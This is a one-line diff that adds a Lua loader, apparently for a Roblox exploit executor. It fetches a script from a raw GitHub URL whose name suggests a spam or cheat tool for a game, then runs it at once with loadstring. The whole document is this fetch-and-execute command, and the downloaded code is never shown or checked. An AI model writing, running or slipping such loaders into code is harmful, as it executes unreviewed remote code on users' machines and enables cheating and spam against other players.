@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/catch-the-artist-spam6-44o0d217ou93je.lua"))()
